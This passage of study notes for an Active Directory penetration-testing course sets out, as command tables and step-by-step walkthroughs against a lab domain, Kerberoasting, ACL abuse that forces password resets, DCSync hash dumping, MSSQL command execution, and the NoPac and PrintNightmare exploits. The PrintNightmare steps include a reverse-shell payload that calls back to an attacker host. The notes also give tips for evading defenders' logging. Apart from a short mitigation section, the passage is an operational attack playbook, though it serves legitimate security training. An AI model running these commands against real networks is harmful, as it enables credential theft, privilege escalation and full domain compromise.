If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

| Command                                         | What it does                                      |
| ----------------------------------------------- | ------------------------------------------------- |
| `net accounts`                                  | Shows local password-policy information.          |
| `net accounts /domain`                          | Shows domain password and lockout policy.         |
| `net group /domain`                             | Lists domain groups.                              |
| `net group "Domain Admins" /domain`             | Lists members of Domain Admins.                   |
| `net group "domain computers" /domain`          | Lists domain computer accounts.                   |
| `net group "Domain Controllers" /domain`        | Lists Domain Controller computer accounts.        |
| `net group <domain_group_name> /domain`         | Lists members of a specified domain group.        |
| `net groups /domain`                            | Lists domain groups.                              |
| `net localgroup`                                | Lists local groups.                               |
| `net localgroup administrators /domain`         | Lists members of the domain administrators group. |
| `net localgroup Administrators`                 | Shows the local Administrators group.             |
| `net localgroup administrators [username] /add` | Adds a user to the local Administrators group.    |
| `net share`                                     | Shows shares on the current machine.              |
| `net user <ACCOUNT_NAME> /domain`               | Shows information about a specific domain user.   |
| `net user /domain`                              | Lists domain users.                               |
| `net user %username%`                           | Shows information about the current user.         |

---

## 9. Net — Shares & Computers

|Command|What it does|
|---|---|
|`net use x: \computer\share`|Maps a remote share to a local drive.|
|`net view`|Lists visible computers.|
|`net view /all /domain[:domainname]`|Lists available shares across the domain.|
|`net view \computer /ALL`|Lists shares on a specific computer.|
|`net view /domain`|Lists computers in the domain.|

---

## 10. Dsquery

Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects.

| Command                                                                                                                                                      | What it does                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------ |
| `dsquery user`                                                                                                                                               | Finds AD user objects.                                 |
| `dsquery computer`                                                                                                                                           | Finds AD computer objects.                             |
| `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`                                                                                                             | Searches all objects in the specified Users container. |
| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Finds users with the `PASSWD_NOTREQD` UAC flag.        |
| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`                                                        | Finds Domain Controller accounts using the UAC flag.   |

---

## 11. LDAP Filtering

LDAP is a protocol used to communicate with a directory service, such as Active Directory, and query information stored there.

|Item|Meaning|
|---|---|
|`1.2.840.113556.1.4.803`|Bitwise AND — checks whether a specific UAC bit is set.|
|`1.2.840.113556.1.4.804`|Bitwise OR — checks whether any matching bit is set.|
|`1.2.840.113556.1.4.1941`|Recursive LDAP matching rule for nested relationships.|
|`&`|AND — all conditions must match.|
|`\|`|OR — at least one condition must match.|
|`!`|NOT — excludes matching objects.|

### Example

```text
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

Finds a **user** with the specified UAC bit set.


## Question answer for 3:

`dsquery * -filter "(description=*HTB*)" -attr name description` or `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -limit 5 -attr sAMAccountName description`, 2 is for diasbled accounts.

---
---

# Section 17 — Kerberoasting from Linux

**Kerberoasting** targets **domain user accounts with Service Principal Names (SPNs)**. I need **domain-level access** to perform the attack.

The basic idea is:

```text
Find SPN-associated accounts
        ↓
Request their Kerberos TGS tickets
        ↓
Extract ticket/hash material
        ↓
Crack it offline
        ↓
Try to recover the service account password
```

---

The main tool to use from Linux is **Impacket `GetUserSPNs.py`**.

## 1. Install / Setup

|Command|What it does|
|---|---|
|`sudo python3 -m pip install .`|Installs the current Python package and its required components.|
|`GetUserSPNs.py -h`|Shows the available options for `GetUserSPNs.py`.|

---

## 2. Find Accounts with SPNs

### Impacket — `GetUserSPNs.py`

| Command                                                          | What it does                                                                                   |
| ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Uses valid domain credentials to query the Domain Controller and find user accounts with SPNs. |

---

## 3. Request TGS Tickets

| Command                                                                                                      | What it does                                                                     |
| ------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------- |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`                                    | Finds SPN-associated accounts and requests their Kerberos service tickets (TGS). |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`                        | Requests a TGS specifically for the `sqldev` account.                            |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Requests the `sqldev` TGS and saves the ticket/hash material to `sqldev_tgs`.    |

---

## 4. Crack the TGS Hash

|Command|What it does|
|---|---|
|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`|Uses Hashcat mode `13100` to crack the Kerberos TGS hash with `rockyou.txt`.|

### Linux Kerberoasting Flow

```text
GetUserSPNs.py
      ↓
Find SPNs
      ↓
Request TGS
      ↓
Save TGS hash
      ↓
Hashcat -m 13100
      ↓
Try to recover password
```

---

# Section 18 - Kerberoasting from Windows

From Windows, I can use **native Windows tools, PowerView, Rubeus, or Mimikatz**.

---

## 1. Find SPNs

### Native Windows — `setspn.exe`

|Command|What it does|
|---|---|
|`setspn.exe -Q */*`|Searches Active Directory for registered SPNs.|

### PowerView

|Command|What it does|
|---|---|
|`Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname`|Finds domain users with SPNs and displays their usernames.|

---

## 2. Request TGS Tickets

### Native Windows Kerberos

| Command                                                                                                                                                                                                      | What it does                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------- |
| `Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`                            | Requests a TGS for **that exact SPN**                                  |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Finds **many SPNs**, then requests TGS tickets for the discovered SPNs |

---

## 3. PowerView — Request TGS

| Command                                                                                                             | What it does                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `Import-Module .\PowerView.ps1`                                                                                     | Loads PowerView so I can use its AD enumeration commands.                                                       |
| `Get-DomainUser * -spn \| select samaccountname`                                                                    | Finds all domain users with SPNs and displays their usernames.                                                  |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`                                            | Finds the `sqldev` account, requests its TGS, and outputs it in **Hashcat-compatible format**.                  |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Finds all SPN users, requests their TGS tickets, formats them for Hashcat, and saves the results to a CSV file. |
| `cat .\ilfreight_tgs.csv`                                                                                           | Displays the collected TGS/hash information from the CSV file.                                                  |

---

## 4. Rubeus — Kerberoasting

| Command                                                                                                | What it does                                                                                                       |
| ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| `.\Rubeus.exe`                                                                                         | Displays Rubeus help and available commands.                                                                       |
| `.\Rubeus.exe kerberoast /stats`                                                                       | Shows statistics about accounts with SPNs that may be Kerberoastable.                                              |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`                                           | Targets privileged/admin-count accounts with SPNs and outputs the roastable ticket material without line wrapping. |
| `.\Rubeus.exe kerberoast /ldapfilter:"(servicePrincipalName=vmware/inlanefreight.local)" /nowrap`      |                                                                                                                    |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`                                                        | Requests the TGS for the specific `testspn` account and outputs it without line wrapping.                          |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | Checks the account's username, SPN, and supported Kerberos encryption types.                                       |
| `.\Rubeus.exe kerberoast /spn:"vmware/inlanefreight.local"`                                            | **search the SPN for a particular account.                                                                         |

Rubeus `/tgtdeleg` uses the tgtdeleg technique to request Kerberos service tickets using RC4, even for some AES-enabled service accounts. Since RC4 TGS hashes are much faster to crack than AES hashes, this can make offline password cracking significantly faster.

**Both → RC4**  
**`/tgtdeleg` → broader/aggressive**  
**`/rc4opsec` → filtered/OPSEC**


---

## 5. Mimikatz — Export Kerberos Tickets

|Command|What it does|
|---|---|
|`mimikatz # base64 /out:true`|Makes Mimikatz display exported ticket data in Base64 format.|
|`kerberos::list /export`|Lists Kerberos tickets and exports them to files.|
|`echo "<base64 blob>" \| tr -d \n`|Removes newline characters from Base64 ticket data.|
|`cat encoded_file \| base64 -d > sqldev.kirbi`|Decodes the Base64 data and saves it as a `.kirbi` ticket file.|

---

## 6. Convert `.kirbi` for Hashcat

|Command|What it does|
|---|---|
|`python2.7 kirbi2john.py sqldev.kirbi`|Converts the `.kirbi` ticket into output suitable for password cracking.|
|`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`|Reformats the extracted ticket data into Hashcat format.|
|`cat sqldev_tgs_hashcat`|Displays the formatted TGS hash before cracking.|

---

## 7. Crack the TGS Hash

|Command|What it does|
|---|---|
|`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`|Cracks the reformatted Kerberos TGS hash using Hashcat mode `13100`.|
|`hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`|Cracks an RC4-based Kerberos TGS hash using Hashcat mode `13100`.|

---

If you have nothing set up yet, you can use one Kerberoasting tool to do the main Kerberoasting work, then Hashcat to crack the result. 

## Mitigation & Detection

### Mitigation

- Use **long, complex service-account passwords** that are not in wordlists
- Prefer **MSA/gMSA** or **LAPS**, which use strong passwords and automatically rotate them.
- **Restrict/disable RC4** for Kerberos where possible, after testing for compatibility.
- Avoid using **Domain Admin or highly privileged accounts as SPN/service accounts**.

### Detection

- Enable **Audit Kerberos Service Ticket Operations** on Domain Controllers.    
- Monitor **Event ID 4769** (TGS requested) and **4770** (TGS renewed).
- A sudden/high number of **TGS requests from one account** in a short period can indicate Kerberoasting.
- **RC4 (`0x17`)** TGS requests are especially worth investigating.
- Around **10–20 TGS requests per account** can be normal; unusually large bursts are suspicious.


---
---

# Section 19 , 20 , 21 - ACL Enumeration & Tactics

ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

There are two types of ACLs:

1. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.

| **ACE**              | **Description**                                                                                                                                                            |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object                                                                                   |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object                                                                                  |
| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred |

GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack.
## ACL Enumeration & Abuse — Step-by-Step

## 1. Find Interesting ACLs

Load PowerView:

```powershell
Import-Module .\PowerView.ps1
```

Find interesting permissions:

```powershell
Find-InterestingDomainAcl
```

Think:

```text
WHO → CAN DO WHAT → TO WHOM
```

---

## 2. Find What a User/Group Can Control

If I find an interesting principal, such as `wley`, get its SID:

```powershell
$sid = Convert-NameToSid wley
```

Check what objects they have permissions over:

```powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Show readable permission names:

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

For one specific object:

```powershell
Get-DomainObjectACL -Identity "Help Desk Level 1" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```

---

## 3. 🔄 Follow the ACL Chain

After checking a principal's permissions, ask:

> **Did I discover another interesting user/group?**

### If YES → investigate that new principal

```text
Find principal → Check ACL → Discover new principal → Check new principal → Repeat
```

Example:

```text
Information Technology → adunn → another group
```

If I discover `adunn`:

```powershell
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

If I discover another group:

```powershell
$sid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```

**I don't restart from Step 1. I investigate the new principal and keep following the chain.**

### If NO → move toward abuse

```text
No new useful principal → Understand permission → Abuse it
```

**Important:** Iteration is a **loop**, not a one-time step.

---

## 4. Understand an Unknown Permission/GUID

If an ACL shows an unknown GUID:

```powershell
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```

→ Find out what that permission means.

---

## 5. Find Domain Users When Needed

Save all domain usernames:

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Check user objects for permissions granted to `wley`:

```powershell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\wley'}}
```

---

## 6. Investigate Groups

Check whether a group is nested inside another group:

```powershell
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

List its members with PowerView:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

List its members with native AD PowerShell:

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

---

# 7. Abuse the Permission

Once I find an **exploitable permission**, I stop iterating and abuse it. Example:

```text
wley → can change password → damundsen
```

First create credentials for **wley**:

```powershell
$SecPassword = ConvertTo-SecureString '<wleys_actual_passwords>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Then create the **new password that will be assigned to damundsen**:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Use wley's permission:

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

---


## 8. Use the New Identity

After taking control of `damundsen`, create `$Cred2`:

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Now if `damundsen` has permission to modify `Help Desk Level 1`:

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

The chain becomes:

```text
wley → damundsen → Help Desk Level 1
```

At this point, I can **iterate again** if the new group membership gives me another interesting path.

⚠️ Why Are There `$Cred`, `$Cred2`, `$SecPassword`, and `$damundsenPassword`?

|Variable|What it contains|
|---|---|
|`$SecPassword`|Temporary SecureString containing a password|
|`$Cred`|**wley's credentials**|
|`$damundsenPassword`|**New password being assigned to damundsen**|
|`$Cred2`|**damundsen's credentials** after we know the new password|

---

## 9. Other ACL Abuse

Add an SPN if I have permission:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus. `.\Rubeus.exe kerberoast /user:adunn /nowrap`

Remove the SPN afterward:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

Remove group membership afterward:

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

---

## 10. Read SDDL When Needed

```powershell
ConvertFrom-SddlString
```

→ Convert SDDL into a more readable PowerShell representation.

---

# 🩸 BloodHound

After manually investigating ACLs with PowerView, **BloodHound makes the attack path easier to see visually**. After collecting data with SharpHound:

```text
Select user → Node Info → Outbound Control Rights
```

- **First Degree Object Control** → direct control
- **Transitive Object Control** → longer ACL chains
- Right-click an edge → **Help** → see abuse information

Example:

```text
wley → ForceChangePassword → damundsen
```

BloodHound can also reveal privileges such as **DCSync**.

> **PowerView = manually investigate.**  
> **BloodHound = visualize the attack path.**

---

# 🧠 Final Workflow

```text
Find ACL
→ Identify principal
→ Check what they control
→ Understand permission
→ New interesting principal?
   → YES → Check that new principal
   → NO  → Look for exploitable permission
→ Abuse permission
→ Gain new identity/access
→ New useful path?
   → YES → Iterate again
   → NO  → Continue/finish
```


---
---


# Section 22 - DCSync

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data. To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

| Command                                                                                                                                                                                                                                                                                                     | Description                                                                                                                                                                                                               |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-DomainUser -Identity adunn \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl`                                                                                                                                                                                                        | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host.                                                                            |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host.         |
| `Get-DomainUser -Identity * \| ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} \| select samaccountname,useraccountcontrol`                                                                                                                                                                  | Check for accounts with reversible encryption                                                                                                                                                                             |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`                                                                                                                                                                                                          | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`                                                                                                                                                                                                                  | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host.                                                                                                                                                   |

---
---

# Section 23 - Privileged Access

### 1. Windows Group Enumeration

| Command                                                                                      | Description                                                  |
| -------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`    | Enumerates members of the **Remote Desktop Users** group.    |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | Enumerates members of the **Remote Management Users** group. |

---

### 2. Create PowerShell Credentials

Creating PowerShell credentials packages a **username and password into a `PSCredential` object**. PowerShell Remoting uses this object to authenticate to another Windows machine, so I create `$cred` from the known account credentials and pass it to `Enter-PSSession`. **Why not put the username/password directly into `Enter-PSSession`?** Because `-Credential` expects a **`PSCredential` object**, not a plain username/password pair. In short: **password → credential object → authenticate → remote PowerShell session**.

| Command                                                                                            | Description                                                       |
| -------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`                               | Converts the plaintext password into a PowerShell `SecureString`. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a credential object containing the username and password. |

---

### 3. Remote Windows Access

| Command                                                           | Description                                                                          |
| ----------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Opens an interactive PowerShell session on the remote Windows machine using `$cred`. |
| `evil-winrm -i 10.129.201.234 -u forend`                          | Connects to a Windows target from Linux using **WinRM**.                             |

---

### 4. PowerUpSQL — Find SQL Server

| Command                          | Description                                    |
| -------------------------------- | ---------------------------------------------- |
| `Import-Module .\PowerUpSQL.ps1` | Imports the **PowerUpSQL** module.             |
| `Get-SQLInstanceDomain`          | Enumerates SQL Server instances in the domain. |

### 5. PowerUpSQL — Query MSSQL

| Command                                                                                                                                  | Description                                                                    |
| ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | Connects to MSSQL and runs `Select @@version` to check the SQL Server version. |

---

### 6. Impacket — Connect to MSSQL

| Command                                                             | Description                                                       |
| ------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `mssqlclient.py`                                                    | Displays the available functionality/options of the MSSQL client. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Connects to MSSQL from Linux using **Windows authentication**.    |
| `SQL> help`                                                         | Shows available commands after connecting to MSSQL.               |

---

### 7. MSSQL → Windows OS Commands

| Command                    | Description                                                                                           |
| -------------------------- | ----------------------------------------------------------------------------------------------------- |
| `SQL> enable_xp_cmdshell`  | Enables `xp_cmdshell`, allowing MSSQL to execute Windows OS commands.                                 |
| `xp_cmdshell whoami /priv` | Runs `whoami /priv` through MSSQL to see the privileges of the Windows account executing the command. |



---
---


# Section 24 - Kerberos Double Hop

The **Double Hop problem** happens when I connect to one Windows machine and then try to access another machine from there. My PC → DEV01 → DC01

The first connection works: My PC → DEV01 ✅

But the second connection can fail: DEV01 → DC01 ❌

### Why?

I have valid credentials, so I can log in to DEV01. But **DEV01 does not automatically get the credentials/ticket it needs to log in to another machine as me**. This is called the **Kerberos Double Hop problem**.

## Check the Tickets

Connect to DEV01:

```powershell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
```

Then:

```powershell
klist
```

The important thing is that my **TGT is not available to DEV01**. Without the TGT, DEV01 cannot easily get another Kerberos ticket to access DC01 as me.  If it has server:  **`krbtgt/...` = means it has TGT.** But if it has server: **`HTTP/DEV01`, `CIFS/DC01`, etc. = service tickets for a specific service, not a tgt.** So when checking a Double Hop with `klist`, **look specifically for `krbtgt`**

## Example of the Problem

Inside DEV01, I run:

```powershell
Get-DomainUser -spn
```

This may fail because PowerView needs to communicate with the domain/DC, but the second authentication cannot happen.

---

# Workaround 1 — Give the Credentials Again

I can manually give PowerView my credentials again:

```powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
get-domainuser -spn -credential $Cred | select samaccountname
```

The important part is:

```powershell
-credential $Cred
```

I am basically saying:

> **"Use these credentials again when talking to the domain."**

---

# Workaround 2 — RunAs Session

Another solution is to make the PowerShell session run using the specified account:

```powershell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

Register the session:

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM
```

Then reconnect:

```powershell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
```

Check tickets:

```powershell
klist
```

Then try:

```powershell
get-domainuser -spn | select samaccountname
```

This method requires an **Administrator PowerShell session**.

---

# RDP vs WinRM

RDP can behave differently because it creates a normal interactive Windows login session.

So: RDP → Kerberos credentials available → Second hop can work

But normally: WinRM → credentials aren't delegated → Second hop fails

---
---


# Section 25 - Bleeding Edge Vulnerabilities

## 1. NoPac

**NoPac (CVE-2021-42278 + CVE-2021-42287)** abuses two bugs in Active Directory. Together, they can let a low-privileged user **impersonate a Domain Controller account** and potentially get very powerful domain access.

| Command                                                                                    | Description                                                                                                     |
| ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
| `sudo git clone https://github.com/Ridter/noPac.git`                                       | Used to clone a `noPac` exploit using git. Performed from a Linux-based host.                                   |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |
#### Option 1:

| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the `noPac`/`Sam_The_Admin` vulnerability and gain a SYSTEM shell (`-shell`). Percd formed from a Linux-based host. |
| ---------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. It cant cd, requires full path.
#### Option 2:

| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the `noPac`/`Sam_The_Admin` vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller to get the **Administrator NTLM hash** from a Linux-based host. |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `crackmapexec smb 172.16.5.5 -u administrator -H <ADMIN_NTLM_HASH>`                                                                                                                           | verify it against the DC using an SMB authentication test.                                                                                                                                                                |
| `impacket-psexec -hashes :<ADMIN_NTLM_HASH> administrator@172.16.5.5`                                                                                                                         | Log in and enjoy the shell.                                                                                                                                                                                               |


---

## 2. PrintNightmare

**PrintNightmare (CVE-2021-34527)** is a Windows vulnerability in the **Print Spooler** service, which manages printing. Because of the bug, an attacker can abuse the service to make Windows **run code with SYSTEM privileges**, which is the highest level of privilege. 

| Command                                                                                                                           | Description                                                                                                                                                                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `git clone https://github.com/cube0x0/CVE-2021-1675.git`                                                                          | Used to clone a PrintNightmare exploit using git from a Linux-based host.                                                                                                                                                                                                                 |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`                    | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.                                                                                                                               |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`                                                                               | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host.                                                                                                                                                                                                |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`                       | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.                                                                                                                                                                    |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`                                                               | Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. Then run a multi handler in msf. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.                                                                                                                                                                                    |

**`msfvenom` creates the payload/script**, while **`multi/handler` waits for that payload to connect back**.The important part is that the **handler must be configured to match the payload**: same payload type, `LHOST`, and `LPORT` (where applicable).

---

## 3. PetitPotam

**PetitPotam (CVE-2021-36942)** is a Windows vulnerability that can **force a Domain Controller to authenticate to another machine using NTLM**. If **AD CS** is running, an attacker can relay this authentication to the Certificate Authority and request a certificate for the Domain Controller. That certificate can then be used to get a **Kerberos TGT for the DC**, which can potentially be used for **DCSync**  (**DCSync** means **pretending to be a Domain Controller and asking another Domain Controller for password data**) and full domain compromise. PetitPotam was **patched by Microsoft in August 2021**.

DC availability+ AD CS Web Enrollment (`/certsrv`) + NTLM relay possibility → investigate PetitPotam.

### i. NTLM Relay — `ntlmrelayx`

|Command|What it does|
